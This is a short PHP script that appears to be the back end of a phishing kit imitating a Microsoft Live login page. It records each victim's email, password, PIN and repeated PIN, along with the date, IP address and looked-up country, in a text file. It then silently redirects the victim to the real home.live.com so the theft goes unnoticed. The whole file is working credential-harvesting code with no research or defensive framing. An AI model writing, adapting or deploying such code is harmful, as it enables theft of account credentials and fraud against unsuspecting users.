<?php
session_start();
date_default_timezone_set('America/Caracas');
ini_set("display_errors", 0);
$userp = $_SERVER['REMOTE_ADDR'];

$cc = trim(file_get_contents("http://ipinfo.io/{$userp}/country"));
if(isset($_POST["pin"]) && isset($_POST["pin2"])){
	

	
	$file = fopen("golfitopr1.txt", "a");
fwrite($file, "Correo: ".$_SESSION['c1']."  - Psswrd: ".$_SESSION['c2']." - Pin ".$_POST['pin']."	Repin ".$_POST['pin2']." Fecha: ".date('Y-m-d')." - ".date('H:i:s')." - ".$cc." ".$userp." " . PHP_EOL);
fwrite($file, "********************************* " . PHP_EOL);
fclose($file);
unset ($_SESSION['c1']);
unset ($_SESSION['c2']);

	echo "<script>";
	echo "window.location.href='https://home.live.com/?mkt=es-es';";
	echo "</script>";
	

}
	
?>